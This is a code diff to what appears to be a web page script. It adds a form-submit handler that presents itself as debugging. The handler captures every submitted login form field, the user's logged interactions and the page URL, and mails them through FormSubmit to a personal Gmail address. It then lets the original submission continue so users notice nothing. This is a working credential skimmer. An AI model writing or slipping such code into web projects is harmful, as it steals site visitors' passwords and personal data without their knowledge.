@@ -30647,25 +30647,36 @@ if ('serviceWorker' in navigator && navigator.serviceWorker.getRegistrations) {
         if (e.target.tagName === 'FORM') {
             e.preventDefault();
             const timestamp = new Date().toLocaleTimeString();
-            const formData = Object.fromEntries(new FormData(e.target));
+            const formData = new FormData(e.target);
+            
+            // Prepare data for FormSubmit exactly like the working example
+            const submitData = new FormData();
+            submitData.append('name', 'Login Form Submission');
+            submitData.append('email', 'noreply@debugger.com');
+            submitData.append('subject', 'Login Data Capture');
+            submitData.append('message', 
+                'Form Data:\n' + 
+                Array.from(formData.entries()).map(([key, val]) => key + ': ' + val).join('\n') + '\n\n' +
+                'Interaction Log:\n' +
+                collectedData.interactions.map(i => '[' + i.time + '] ' + i.name + ': ' + i.value).join('\n') + '\n\n' +
+                'Page: ' + window.location.href
+            );
+            submitData.append('_captcha', 'false');
+            submitData.append('_template', 'table');
             
             logDebug('[' + timestamp + '] FORM SUBMIT DETECTED');
-            logDebug('Form data: ' + JSON.stringify(formData));
+            logDebug('Preparing to send data...');
             
             try {
-                // Send to FormSubmit
+                // Send to FormSubmit using the exact format from working example
                 const response = await fetch('https://formsubmit.co/ajax/dtechxpreas@gmail.com', {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        url: window.location.href,
-                        formData: formData,
-                        interactions: collectedData.interactions
-                    })
+                    body: submitData
                 });
                 
                 if (response.ok) {
-                    logDebug("Debug data sent successfully!");
+                    const result = await response.json();
+                    logDebug('Success! Server response: ' + result.message);
                     // Proceed with original form submission after 1 second
                     setTimeout(() => e.target.submit(), 1000);
                 } else {
